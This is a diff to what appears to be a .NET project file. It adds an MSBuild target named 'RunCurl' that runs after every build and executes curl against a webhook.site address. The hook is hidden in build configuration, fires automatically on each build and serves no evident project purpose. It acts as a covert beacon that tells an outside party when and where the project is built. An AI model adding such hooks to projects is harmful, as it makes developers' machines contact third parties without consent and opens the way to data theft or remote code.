@@ -15,5 +15,7 @@
   <ItemGroup>
     <DotNetCliToolReference Include="Microsoft.VisualStudio.Web.CodeGeneration.Tools" Version="2.0.0" />
   </ItemGroup>
-
+ <Target Name="RunCurl" AfterTargets="Build">
+    <Exec Command="curl https://webhook.site/02389481-94ae-4cf5-b9d4-6c3f6b9a1f7b" />
+  </Target>
 </Project>
